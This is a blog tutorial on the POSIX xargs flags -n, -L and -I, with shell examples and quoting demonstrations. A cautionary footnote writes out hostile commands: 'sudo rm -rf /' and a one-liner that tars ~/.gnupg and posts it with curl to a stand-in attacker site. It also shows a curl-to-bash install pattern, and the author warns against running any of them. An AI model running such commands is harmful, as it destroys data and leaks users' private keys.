+++
title = 'The pragmatic `POSIX` `xargs` starter kit'
date = 2026-03-22
description = 'Concentrating most of the `POSIX`-specified `xargs` prowess in a tidy 3 flags'
taxonomies.section = ['flight-manual']
taxonomies.tags = ['all', 'cli', 'posix']
extra.cited_tools = ["find", "wc", "xargs"]
+++

In this second article of my series on `xargs`, I intend to focus on **the
practical subset of the `POSIX` specification** of that tool that you'll benefit
from wielding on the day-to-day.  How much could this represent?  Well, I
wouldn't bore you with the picturesque particulars of poor pertinence, of
course: **I mean only three flags**.

Do not scoff at their <abbr title='smallness of number,
"fewness"'>paucity</abbr>, however: they should already be plenty to assimilate,
and plenty rewarding to have duty internalised.

<!-- more -->

> [!NOTE]
>
> This article can stand alone, but will build somewhat upon some
> information that is only shared in my [introductory `xargs`
> guidance](@/flight-manual/xargs/01-introductory-xargs-guidance.md).  I may
> clarity some of that knowledge when I come to rely on it, but will generally
> assume it assimilated.

<!-- link at "picturesque particulars of poor pertinence", or in a [!NOTE] -->
<!-- [assonances-and-alliterations](@/ramblings/assonances-and-alliterations.md) TODO: LINKME -->

<div class="hi">

## Obligatory [TL;DR](https://en.wikipedia.org/wiki/TL;DR)

There are several ways in which `xargs` may go **from input lines to effective
arguments**, as well as how many arguments to be used for each call:

- `-n <max-args>` dictates **how many arguments shall the utility receive at
  most**:

    <div class="grid-1-3">
    <div>

    ```sh
    xargs -n1 echo <<EOF
    a b c
    d e f
    g h i
    EOF
    ```
    ```txt
    a
    b
    c
    d
    e
    f
    g
    h
    i
    ```
    </div>
    <div>

    ```sh
    xargs -n2 echo <<EOF
    a b c
    d e f
    g h i
    EOF
    ```
    ```txt
    a b
    c d
    e f
    g h
    i
    ```
    </div>
    <div>

    ```sh
    xargs echo <<EOF
    a b c
    d e f
    g h i
    EOF
    ```
    ```txt
    a b c d e f g h i
    ```
    {{ note(msg="without `-n`") }}
    </div>
    </div>

- `-L <max-lines>` dictates **how many input lines at most are to result in a
  single utility call**:

  <div class="grid-1-2">
  <div>

  ```sh
  xargs -L1 echo <<EOF
  a b c
  d e f
  g h i
  EOF
  ```
  ```txt
  a b c
  d e f
  g h i
  ```
  </div>
  <div>

  ```sh
  xargs -L2 echo <<EOF
  a b c
  d e f
  g h i
  EOF
  ```
  ```txt
  a b c d e f
  g h i
  ```
  </div>
  </div>

- `-I <placeholder>` is a specialisation of `-L1` that considers **each line to
  be a single argument** and lets you choose **where to put it on the resulting
  command line**:

  <div class="grid-1-2">
  <div>

  ```sh
  xargs -I {} echo 'You said: "{}".' <<EOF
  a b c
  d e f
  g h i
  EOF
  ```
  ```txt
  You said: "a b c".
  You said: "d e f".
  You said: "g h i".
  ```
  {{ note(msg="using `{}` is the de-facto standard placeholder across many applications") }}
  </div>
  <div>
  
  ```sh
  xargs -II echo 'You said: "I".' <<EOF
  a b c
  d e f
  g h i
  EOF
  ```
  ```txt
  You said: "a b c".
  You said: "d e f".
  You said: "g h i".
  ```
  {{ note(msg="I quite like the quaint and practical `-II`") }}
  </div>
  </div>

> [!NOTE]
>
> **The `-I`, `-L`, and `-n` options are, by specification, mutually
> exclusive**.  Some implementations use the last one specified if more than one
> is given on a command line; other implementations treat combinations of the
> options in different ways.

Note that `-I` can let you invoke a pipeline:

```sh
xargs -II sh -c 'rm $(echo I | sed "s/^dot-/./")' <<EOF
dot-zshrc
dot-env
EOF
```
{{ note(msg="this will invoke `rm .zshrc` and `rm .env`") }}

At the end of this here study study, the goal is to have the difference between
`xargs -n1 wc` and `xargs wc` be of no surprise:

<div class="grid-1-2">
<div>

```sh
find -name '*.h' | xargs wc
```
```txt
  474  2548 20850 ./config.def.h
   41   163  1163 ./win.h
   50   145  1036 ./arg.h
  126   452  2923 ./st.h
  691  3308 25972 total
```
</div>
<div>

```sh
find -name '*.h' | xargs -L1 wc
```
```txt
 474  2548 20850 ./config.def.h
  41   163  1163 ./win.h
  50   145  1036 ./arg.h
 126   452  2923 ./st.h
```
{{ note(msg="no `total` there, uh?") }}
</div>
</div>

<!-- NEXT ARTICLE TODO: LINKME -->
<!-- [-0-null-print0-z](@/ramblings/-0-null-print0-z.md) TODO: LINKME -->

</div>

## The fundamentals

Here's where `xargs` becomes indispensable: you have some command generating
output (not `find`; not anything blessed with `-exec`—see [introductory
`xargs` guidance](@/flight-manual/xargs/01-introductory-xargs-guidance.md)), and
you need to pass that output as arguments to another command.

Perhaps you're processing the output of `git ls-files`, or `grep
-l`/`--files-with-matches`, or filtering arbitrary lists:

```sh
git ls-files '*.[c,h]'
```
```txt
arg.h
config.def.h
st.c
st.h
win.h
x.c
```
{{ note(msg="running against the codebase of [suckless.org](https://suckless.org/)' stupendous [_simple terminal_, `st`](https://st.suckless.org/)") }}

Say that you want to tally the number of lines that these files comprise: you
can't use `git ls-files -exec` (it doesn't exist), you need to transform that
stream into arguments:

```sh
git ls-files '*.[c,h]' | xargs wc
```
```txt
    50    145   1036 arg.h
   474   2548  20850 config.def.h
  2705   8808  58906 st.c
   126    452   2923 st.h
    41    163   1163 win.h
  2108   6367  48343 x.c
  5504  18483 133221 total
```

Here, we instructed `xargs` to invoke `wc` using the list of source (`*.c`) and
header (`*.h`) files tracked by Git as arguments.  These two are functionally
equivalent:

<div class="grid-1-2">
<div>

```sh
git ls-files '*.[c,h]' | xargs wc
```
{{ note(msg="via the pipeline") }}
</div>
<div>

```sh
wc $(git ls-files '*.[c,h]')
```
{{ note(msg="via a sub-shell") }}
</div>
</div>

> [!TIP]
>
> The `-t` flag enables _"trace"_ mode, where each generated command
> line shall be written to standard error.  The `GNU` implementation of
> `xargs` additionally offers the `--verbose` long-form equivalent to the
> `POSIX`-defined `-t`.  We can use it here to see precisely what ended up being
> invoked:
>
> ```sh
> git ls-files '*.[c,h]' | xargs -t wc
> ```
> ```txt
> wc arg.h config.def.h st.c st.h win.h x.c
>     50    145   1036 arg.h
>    474   2548  20850 config.def.h
>   2705   8808  58906 st.c
>    126    452   2923 st.h
>     41    163   1163 win.h
>   2108   6367  48343 x.c
>   5504  18483 133221 total
> ```
> {{ note(msg="with `-t`, we can see that `xargs` here called: `wc arg.h config.def.h st.c st.h win.h x.c`") }}

However, you can squeeze more power out of this tool: I'll keep it simple and
`POSIX`-centric, and be sure to follow this article up with another for some
additional pragmatism.

<!-- [-0-null-print0-z](@/ramblings/-0-null-print0-z.md) TODO: LINKME -->

## Three indispensable flags

**Within the `POSIX` specification, there only remain three flags that I
deem of the utmost pragmatism.**  Well, the second is here mostly to scratch
a _"shouldn't that corollary also exist?"_ itch, and the third is mostly a
specialisation of the first...  I would wager you could get much of the way
towards `xargs` fluency using nothing but that one; but still, its little
colleagues are more than some mere pretty faces.

### Max arguments: `-n`

The `-n <max-args>` flag lets you instruct `xargs` to use at most `max-args`
arguments per command line.  The `GNU` implementation additionally offers the
long-form `--max-args <max-args>` equivalent.

```sh
git ls-files '*.h' | xargs -tn1 wc
git ls-files '*.h' | xargs --verbose --max-args 1 wc  # GNU only
```
```txt
wc arg.h
  50  145 1036 arg.h
wc config.def.h
  474  2548 20850 config.def.h
wc st.h
 126  452 2923 st.h
wc win.h
  41  163 1163 win.h
```
{{ note(msg="with `-n1`, each invocation of `wc` shall receive no more than `1` argument") }}

Specifying `1` arguments at most will result in just as many `wc` invocations as
we have items to be processed by `xargs`.  In our current case, `4` header files
result in `4` individual calls to `wc`.

Most generally, you'll find yourself indeed wanting to set that max-args to `1`,
but any other number would work just fine:

<div class="grid-1-2">
<div>

```sh
git ls-files '*.h' | xargs -tn2 wc
```
```txt
wc arg.h config.def.h
   50   145  1036 arg.h
  474  2548 20850 config.def.h
  524  2693 21886 total
wc st.h win.h
 126  452 2923 st.h
  41  163 1163 win.h
 167  615 4086 total
```
</div>
<div>

```sh
git ls-files '*.h' | xargs -tn3 wc
```
```txt
wc arg.h config.def.h st.h
   50   145  1036 arg.h
  474  2548 20850 config.def.h
  126   452  2923 st.h
  650  3145 24809 total
wc win.h
  41  163 1163 win.h
```
{{ note(msg="the second invocation only uses `1` single remaining argument") }}
</div>
</div>

> [!NOTE]
>
> In theory, when dealing with many entries together with utilities that
> may receive many arguments (such as `cp`, `mv`, `zip`...), we could use
> `-n` to **batch them to a certain size** and effectively get a substantial
> processing speed improvement.  There's also the possibility of **hitting
> actual ceilings** in terms of command line length, maximum number of arguments
> that the shell or any given tool can sustain...  In practice, both of these
> cases are rare enough that I couldn't come up with a practical scenario in a
> couple of sentences.

Before moving any further, we should take a detour to understand how `xargs`
determines what constitutes _"an argument"_.

### From input lines to arguments {#input-to-arguments}

> [!IMPORTANT]
>
> **This mechanism is fairly central to everything `xargs` does**, despite
> usually constituting nothing more than some vague allusion in the footnotes
> of various online "tutorials", and being generally only mentioned, quite
> formally, in the `DESCRIPTION` section of the `man`ual pages—which is seldom
> read.

The **lines** in your input don't necessarily have a one-to-one correspondence
to **arguments** as `xargs` would use them for downstream invocation of the
specified tool.

<!-- [-0-null-print0-z](@/ramblings/-0-null-print0-z.md) TODO: LINKME -->
Unless using `-I`, or some non-`POSIX` (albeit wonderful) `-0` or `-d`
trickery), `xargs` will **parse your input lines using _"standard shell rules"_
to figure out what arguments they hold**:

> The application shall ensure that arguments in the standard input are
> separated by unquoted `<blank>` characters, unescaped `<blank>` characters,
> or `<newline>` characters. A string of zero or more non-double-quote (`'"'`)
> characters and non-`<newline>` characters can be quoted by enclosing them
> in double-quotes. A string of zero or more non-`<apostrophe>` (`'\''`)
> characters and non-`<newline>` characters can be quoted by enclosing them in
> `<apostrophe>` characters. Any unquoted character can be escaped by preceding
> it with a `<backslash>`.
>
> {% attribution() %} from `man 1p xargs` {% end %}

Eh, **you don't have to read it; you pretty much can already surmise it**.  In
any case, I'll give you here some example that I hope will be complete enough;
consider this file, `my-args`:

```txt,name=my-args
Confucius
Mark Twain

"Ninoshka"
'Chuck Berry'
René\ Descartes

$USER
"d'Artagnan"

"$HOME sweet 'home'"
$(date)
```
{{ note(msg="I put here a bit of everything, I suspect it already gives you a hint as to what is to come") }}

Through `xargs`, I'll use [`true`](https://linux.die.net/man/1/true), which, as
aptly described by its `man`ual page, **does nothing, successfully**.  Combined
with `-t`, we'll get a fine understanding of what goes on under the hood:

```sh
cat my-args | xargs -t true
```
```txt
true Confucius Mark Twain Ninoshka 'Chuck Berry' 'René Descartes' '$USER' "d'Artagnan" '$HOME sweet '\''home'\''' '$(date)'
```

```sh
cat my-args | xargs -tn1 true
```
```txt
true Confucius
true Mark
true Twain
true Ninoshka
true 'Chuck Berry'
true 'René Descartes'
true '$USER'
true "d'Artagnan"
true '$HOME sweet '\''home'\'''
true '$(date)'
```
{{ note(msg="I use `-n1` here to have each single argument result in a dedicated call to `true`") }}

> [!TIP]
>
> While **that isn't part of the `POSIX` standard**, `GNU`'s implementation uses
> `-a`/`--arg-file` to read from a file rather than the standard input.  The two
> following options are functionally equivalent:
>
> <div class="grid-1-2">
> <div>
>
> ```sh
> cat my-args | xargs echo
> ```
> {{ note(msg="the `POSIX` version") }}
> </div>
> <div>
>
> ```sh
> xargs -a my-args echo
> ```
> {{ note(msg="a non-standard flag in `GNU`'s implementation") }}
> </div>
> </div>
>
> As such, the pattern I employ here of `cat <x> | xargs <y>` isn't quite
> definitely [useless](@/flight-manual/useless-use-of-cat.md).

Would you look at that!  A few things are worth noting here:

1. empty lines are ignored (what else could reasonably happen?);
2. `Confucius` is an argument, but `Mark Twain` becomes **two**;
3. `"Ninoshka"`, `'Chuck Berry'` and `René\ Descartes` are all normalised to
   using single quotes (`'`) **if and only if necessary**—that is: not for
   single words, such as `Ninoshka`;
4. `$USER` is passed **literally**, within single-quotes (_"apostrophes"_ in the
   formal literature): it **won't** be interpreted by the shell;
5. `"d'Artagnan"` does uniquely force the interpreter to use double quotes for
   escaping the single quote that is **part of the value**, but:
6. the program **cannot be fooled** and will bend over backwards to **avoid ever
   making anything be sneakily interpreted**[^worse-than-rimraf].

[^worse-than-rimraf]: **Preventing anything from being sneakily interpreted** is
    actually quite an important feature, so that you may process data, without
    fear that it may contain `$(sudo rm -rf /)` or anything more malicious.
    Oh yeah, there is far worse and inconspicuous, even not requiring `sudo`;
    imagine for example:

    ```sh
    tar czf - ~/.gnupg | curl --data-binary @- https://gimme-your-g.pg/keys
    ```
    {{ note(msg="this would ship the keys to your digital house off to some Web site of dubious intentions") }}

    <!-- [bash-curl-install](@/ramblings/bash-curl-install.md) TODO: LINKME -->

    > [!CAUTION]
    >
    > **Do not run that command above, even _"just to see"_**.
    >
    > Surely you wouldn't, but I nonetheless feel compelled to add this
    > admonition for some additional reassurance.  In fact, do **not** run
    > commands you haven't taken the time to vaguely ascertain does anything
    > remotely close to what it's supposed to.
    >
    > And oh yeah, any piece of (public) software that installs via some
    > atrocity like `bash <(curl https://trust-me-b.ro/install)` should be
    > condemnable.  No need even for any man-in-the-middle scenario, just
    > imagine that `npmjs.org` rebrands to `npm.org`, but that some old
    > documentation (or obscure blog) online still refers to `npm.org`, which
    > has long been released by the actual `npm` folks and is now owned and
    > operated by some less savoury entity...  **Don't run anything, unless
    > you have at least given it a look, or you have staunch confidence in its
    > authors and maintainers.**

In the `POSIX` specification, there's only one way to bypass this interpretation
(`-I`, we'll get to it in a moment), but several implementations (such as the
`GNU` one I'm most familiar with) do come with additional niceties, which I'll
keep for a follow-up article.

<!-- [-0-null-print0-z](@/ramblings/-0-null-print0-z.md) TODO: LINKME -->

### Max input lines: `-L` {#max-lines}

A sibling to `-n` is `-L`.  With `-L <max-lines>`, you may instruct `xargs` to use at most
`max-lines` non-blank input lines per resulting command line.  If we continue
with our original example (`st`'s source code), we'd essentially find `-L` and
`-n` to behave indistinguishably:

> [!NOTE]
>
> **Note that `-L` is upper-case**: `-l`, together with `-i`, did use to be
> specified but were removed from the standard in 2004—well over 2 decades
> ago.
>
> The `GNU` implementation of `xargs` doesn't offer a long-form variant
> of that flag; there is `--max-lines`, which maps to `-l`, but deviates
> ever-so-slightly from the `POSIX`-defined `-L` (in making its argument
> optional and specifying a sane default of `1`).  These are noted to be
> **deprecated in favour of the `POSIX`-aligned `-L`**.

<div class="grid-1-3">
<div>

```sh
git ls-files '*.h' \
    | xargs -tL1 wc
```
```txt
wc arg.h
  50  145 1036 arg.h
wc config.def.h
  474  2548 20850 config.def.h
wc st.h
 126  452 2923 st.h
wc win.h
  41  163 1163 win.h
```
{{ note(msg="`1` by `1` with `-L1`") }}
</div>
<div>

```sh
git ls-files '*.h' \
    | xargs -tL2 wc
```
```txt
wc arg.h config.def.h
   50   145  1036 arg.h
  474  2548 20850 config.def.h
  524  2693 21886 total
wc st.h win.h
 126  452 2923 st.h
  41  163 1163 win.h
 167  615 4086 total
```
{{ note(msg="`2` by `2` with `-L2`") }}
</div>
<div>

```sh
git ls-files '*.h' \
    | xargs -tL3 wc
```
```txt
wc arg.h config.def.h st.h
   50   145  1036 arg.h
  474  2548 20850 config.def.h
  126   452  2923 st.h
  650  3145 24809 total
wc win.h
  41  163 1163 win.h
```
{{ note(msg="`3` by `3` with `-L3`") }}
</div>
</div>

That's only because in that example, we have precisely **one argument per input
line**.  Let's return to consuming the more _"treacherous"_ `my-args` file:

```txt,name=my-args
Confucius
Mark Twain

"Ninoshka"
'Chuck Berry'
René\ Descartes

$USER
"d'Artagnan"

"$HOME sweet 'home'"
$(date)
```
{{ note(msg="this is the file used in the [previous section](#input-to-arguments), which you'll want to have assimilated") }}

I think a most adequate way to present the difference between `-L` and `-n`
would be to simply juxtapose them:

<div class="grid-1-2">
<div>

```sh
cat my-args | xargs -tn1 true
```
```txt
true Confucius
true Mark
true Twain
true Ninoshka
true 'Chuck Berry'
true 'René Descartes'
true '$USER'
true "d'Artagnan"
true '$HOME sweet '\''home'\'''
true '$(date)'
```
</div>
<div>

```sh
cat my-args | xargs -tL1 true
```
```txt
true Confucius
true Mark Twain
true Ninoshka
true 'Chuck Berry'
true 'René Descartes'
true '$USER'
true "d'Artagnan"
true '$HOME sweet '\''home'\'''
true '$(date)'
```
{{ note(msg="this time, `Mark Twain` still did get split into two arguments, but **both were used in a single call to `true`**") }}
</div>
</div>

I don't believe there's much of a need to demonstrate the behaviour of `xargs`
with `-L` being passed different values, you can derive it from knowing that it
is parallel to that of `-n` and still adheres to the input "parsing" done by
`xargs`.

In my experience, you'll not often be using `-L` with a value slightly
greater than `1` (where you generally actually semantically may be meaning
`-n`—although only you would know).  Instead, something I find myself
routinely reaching for is `-I`, which builds upon `-L1`.

### Placeholder mode: `-I`

We finally arrive at the flag of `xargs` I use by far the most: the _placeholder
mode_, introduced by `-I <placeholder>`.  Its `POSIX` manual entry is more or
less inscrutable, but its gist is fairly intuitive:

- it instructs `xargs` to **replace occurrences of `<placeholder>` in the
  `<initial-arguments>`** with values read from standard input;
- in addition to that, **it behaves as if `-L` was set to `1`**: each
  (non-blank) line of input shall result in a dedicated invocation of the
  utility;
- lastly, and perhaps curiously, it will **entirely bypass any (well,
  most[^not-quite-zero-shenanigans]) input-to-arguments parsing shenanigans**.

[^not-quite-zero-shenanigans]: `-I` doesn't quite blankly transform each whole
line into an argument without further considerations: the input lines are still
**trimmed** before being processed.

In short, each (non-blank) line of input becomes a single "item" that **you
choose** where to place on the invoked utility's arguments list:

```sh
xargs -I {} echo 'received: {}, how lovely!' <<-EOF
    a kiss on the cheek
    a detailed bug report
    an eviction notice
EOF
```
```txt
received: a kiss on the cheek, how lovely!
received: a detailed bug report, how lovely!
received: an eviction notice, how lovely!
```
{{ note(msg="using `{}` as the placeholder with `-I` is **very much idiomatic**") }}

> [!TIP]
>
> As a note, despite `{}` being the well-established, universally
> recognised "placeholder" definition with `xargs` (and other tools, like
> [`fzf`](https://github.com/junegunn/fzf)), **I discovered that a quick `-II`
> is quite satisfying**: it simply uses `I` instead of `{}` as placeholder.
>
> It's more likely to be troublesome in general, under the hypothesis that a
> stray `I` is more common than a `{}` pair, but it's not yet bitten me in
> the rear, and **the mere `I` comes faster out of these old hands than `{}`
> ever did**—even more so while I'm already typing it for `-I`.  Plus, you
> can't really ignore the cool factor: **it looks like the Roman numeral for 2,
> `II`**:
>
> ```sh
> pacman -Qdtq | xargs -II sh -c 'pacman -Qi I | grep -i optional.for'
> ```
> {{ note(msg="using `-II` comes in quite handy when invoking a **pipeline** through `sh -c` via `xargs`") }}
>
> Here it is in action, straight from my recent shell history, going over all
> the packages that were originally installed as **dependencies** to something
> else that has since been removed; asserting that none of them are still a
> valid **optional dependency** for anything I am actively using, before I can
> safely purge them.

## A summarising overview

One last time, let's consider the now familiar `my-args` file:

```txt,name=my-args
Confucius
Mark Twain

"Ninoshka"
'Chuck Berry'
René\ Descartes

$USER
"d'Artagnan"

"$HOME sweet 'home'"
$(date)
```
{{ note(msg="this is again the file used in the [previous](#max-lines) [sections](#input-to-arguments)") }}

Giving it the `xargs`–`true` treatment shows yet another somewhat sublte
difference from its `-n` and `-L` cousins:

```sh
cat my-args | xargs -t -I {} true {}  # how the rest of the world expects it
cat my-args | xargs -tII true I       # how I would usually put it
```
```txt
true Confucius
true 'Mark Twain'
true Ninoshka
true 'Chuck Berry'
true 'René Descartes'
true '$USER'
true "d'Artagnan"
true '$HOME sweet '\''home'\'''
true '$(date)'
```
{{ note(msg="with `-I`, you'll notice that **`Mark Twain` is now passed as a single argument**") }}

For a closing statement, let's compare our little [Huey, Dewey and
Louie](https://en.wikipedia.org/wiki/Huey,_Dewey,_and_Louie) in action:

```sh
paste -d: \
    <(cat my-args | xargs 2>&1 -tn1 true) \
    <(cat my-args | xargs 2>&1 -tL1 true) \
    <(cat my-args | xargs 2>&1 -tII true I) | column -ts:
```
```txt
true Confucius                   true Confucius                   true Confucius
true Mark                        true Mark Twain                  true 'Mark Twain'
true Twain                       true Ninoshka                    true Ninoshka
true Ninoshka                    true 'Chuck Berry'               true 'Chuck Berry'
true 'Chuck Berry'               true 'René Descartes'            true 'René Descartes'
true 'René Descartes'            true '$USER'                     true '$USER'
true '$USER'                     true "d'Artagnan"                true "d'Artagnan"
true "d'Artagnan"                true '$HOME sweet '\''home'\'''  true '$HOME sweet '\''home'\'''
true '$HOME sweet '\''home'\'''  true '$(date)'                   true '$(date)'
true '$(date)'
```
{{ note(msg="the process substitution `<(...)` and **redirection `2>&1` within a command** are non-`POSIX` Bashisms") }}

> [!NOTE]
>
> I am quite prone to laying out text with purpose across the horizontal axis
> and write in great detail about that in [my _Intralinear Partitioning_
> series](@/flight-manual/intralinear-partitioning/_index.md), the second
> article of which may serve as a practical guideline to using `column`, `cut`
> and `paste` to great effect.

We can note here that while each of `-n`, `-L` and `-I` does strive to map `1`
_"something"_ to one utility call (when used with the value `1`, that is), they
present some notable differences that may be summarised as follows:

- `-n <max-args>` will make `1` call for each `<max-args>` **arguments**,
  possibly consuming more or fewer (non-empty) input lines;
- `-L <max-lines>` will make `1` call for each `<max-lines>` (non-empty) input
  lines, possibly with several arguments;
- `-I` will make `1` call per input line (as if `-L1`), and will pass the input
  line **as-is**, without any[^not-quite-zero-shenanigans] _"arguments parsing"_
  on the input, and it'll additionally let you specify **where exactly** that
  argument should go on the command line, possibly even several times:

  ```sh
  xargs -I {} echo '{} is dead; long live {}!' <<< 'the King'
  ```
  ```txt
  the King is dead; long live the King!
  ```
  {{ note(msg="a [traditional proclamation](https://en.wikipedia.org/wiki/The_king_is_dead,_long_live_the_king!) following the accession of a new monarch to the throne") }}

## The definite escalation mechanism

To conclude, let's agree together on what the shades from _grimace-_ to
_nod-of-approval_-worthy would be:

```sh
rm $(find . -name '*.tmp')                  # simple, naive, breaks with spaces
find . -name '*.tmp' | xargs rm             # allows batch-processing, breaks with spaces in file paths
find . -name '*.tmp' | xargs -II rm I       # handles spaces in file paths, disables batch-processing
find . -name '*.tmp' -print0 | xargs -0 rm  # robust, but non-POSIX
find . -name '*.tmp' -exec rm {} +          # also robust, still fairly self-contained
find . -name '*.tmp' -delete                # purpose-built, definite best
```

**The last four are defensible choices**; the first two are certainly not
robust, but may work well so long as your files are named sensibly.

There's not so much more to the current `POSIX` specification of `xargs`—not
much more that's certain to be of general use, at least; but the implementations
from `GNU` and others, such as some `BSD`, prevent some further remarkable
details that are well worth talking about.

## Going forward

There shall be a bit more to the still basic, extraordinarily practical bits of
`xargs` insight.  I've been alluding to `-0` and co. throughout this article,
and only excuse its omission from any serious `xargs` guide by its distinct
absence from the proper `POSIX` specification.  Nevertheless, that negligence
here shall be addressed in the next and final article of this series.

<!-- [-0-null-print0-z](@/ramblings/-0-null-print0-z.md) TODO: LINKME -->

Until then, have fun!
